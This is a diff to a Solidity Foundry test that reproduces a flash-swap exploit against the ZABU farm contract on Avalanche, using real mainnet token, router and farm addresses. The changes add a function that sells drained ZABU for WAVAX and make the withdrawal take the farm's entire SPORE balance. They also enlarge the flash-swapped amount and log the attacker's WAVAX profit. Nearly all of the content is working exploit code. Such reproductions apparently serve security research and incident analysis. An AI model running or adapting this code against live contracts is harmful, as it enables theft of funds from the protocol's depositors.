@@ -21,11 +21,11 @@ interface PangolinRouter{
 
 contract depositToken{
 
+    IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);
     IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
     IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);
     Uni_Router_V2 Router = Uni_Router_V2(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);
     ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);
-    uint amount;
 
     function depositSPORE() payable external{
         address(WAVAX).call{value: 1 ether}("");
@@ -41,12 +41,26 @@ contract depositToken{
             address(this),
             block.timestamp
         );
-        amount = SPORE.balanceOf(address(this));
-        Farm.deposit(uint256(38), amount);
+        Farm.deposit(uint256(38), SPORE.balanceOf(address(this)));
     }
 
     function withdrawSPORE() external{
-        Farm.withdraw(uint256(38), amount);
+        Farm.withdraw(uint256(38), SPORE.balanceOf(address(Farm)));
+    }
+
+    function sellZABU() external{
+        address [] memory path = new address[](2);
+        path[0] = address(ZABU);
+        path[1] = address(WAVAX);
+        WAVAX.approve(address(Router), type(uint).max);
+        ZABU.approve(address(Router), type(uint).max);
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            ZABU.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
     }
 
 }
@@ -74,17 +88,11 @@ contract ContractTest is DSTest{
 
     function testExploit() public payable {
 
-        emit log_named_decimal_uint(
-            "Attacker ZABU balance before exploit",
-            ZABU.balanceOf(address(this)),
-            18
-        );
-
         SPORE.approve(address(Farm), type(uint).max);
         WAVAX.approve(address(Router), type(uint).max);
         (reserve0Pair1, reserve1Pair1, ) = PangolinPair1.getReserves();
         (reserve0Pair2, reserve1Pair2, ) = PangolinPair2.getReserves();
-        address(WAVAX).call{value: 1700 ether}("");
+        address(WAVAX).call{value: 2500 ether}("");
         // depost SPORE
         ContractFactory();
         (bool success, ) = addressContract.call{value: 1 ether}(abi.encodeWithSignature("depositSPORE()"));
@@ -97,10 +105,12 @@ contract ContractTest is DSTest{
         cheats.roll(block.number + 1001);
         (bool success1, ) = addressContract.call(abi.encodeWithSignature("withdrawSPORE()"));
         require(success1);
+        (bool success2, ) = addressContract.call(abi.encodeWithSignature("sellZABU()"));
+        require(success2);
 
         emit log_named_decimal_uint(
-            "Attacker ZABU balance after exploit",
-            ZABU.balanceOf(addressContract),
+            "Attacker WAVAX profit after exploit",
+            WAVAX.balanceOf(addressContract) - 2500 * 1e18,
             18
         );
 
@@ -117,7 +127,7 @@ contract ContractTest is DSTest{
             uint amountWAVAX = 
                 (reserve0Pair1 * reserve1Pair1 / ((SPOREInPair1 * 1000 - amountSPORE0 * 3 * 96 / 100) / 1000) - WAVAXInPair1) * 1000 / 
                 997;
-            WAVAX.transfer(address(PangolinPair1), uint(1536091047194637407297));
+            WAVAX.transfer(address(PangolinPair1), amountWAVAX);
         }
 
         if(msg.sender == address(PangolinPair2)){
